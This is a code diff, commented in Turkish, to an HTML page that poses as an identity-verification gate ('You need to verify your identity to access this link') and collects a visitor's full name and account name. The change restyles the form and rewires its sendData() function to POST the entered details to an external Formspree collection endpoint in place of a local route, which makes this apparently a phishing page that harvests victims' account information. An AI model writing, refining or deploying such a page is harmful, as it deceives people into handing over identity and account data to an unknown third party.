@@ -32,6 +32,7 @@ input{
   border-radius:12px;
   padding:0 15px;
   color:white;
+  box-sizing: border-box; /* Input taşmalarını önlemek için eklendi */
 }
 
 button{
@@ -40,6 +41,9 @@ button{
   border:none;
   border-radius:12px;
   cursor:pointer;
+  background: white;
+  color: black;
+  font-weight: bold;
 }
 
 </style>
@@ -54,9 +58,9 @@ button{
 You need to verify your identity to access this link.
 </p>
 
-<input type="text" id="fullname" placeholder="First name and last name">
+<input type="text" id="fullname" name="fullname" placeholder="First name and last name">
 
-<input type="text" id="account" placeholder="Account name">
+<input type="text" id="account" name="account" placeholder="Account name">
 
 <button onclick="sendData()">Continue</button>
 
@@ -69,18 +73,24 @@ async function sendData(){
   const fullname = document.getElementById("fullname").value;
   const account = document.getElementById("account").value;
 
-  await fetch("/save",{
-    method:"POST",
-    headers:{
-      "Content-Type":"application/json"
+  // Formspree API'sine istek atıyoruz
+  const response = await fetch("https://formspree.io/f/xwvzrdrv", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
     },
-    body:JSON.stringify({
-      fullname,
-      account
+    body: JSON.stringify({
+      fullname: fullname,
+      account: account
     })
   });
 
-  alert("Saved");
+  if (response.ok) {
+    alert("Saved");
+  } else {
+    alert("An error occurred. Please try again.");
+  }
 
 }
 
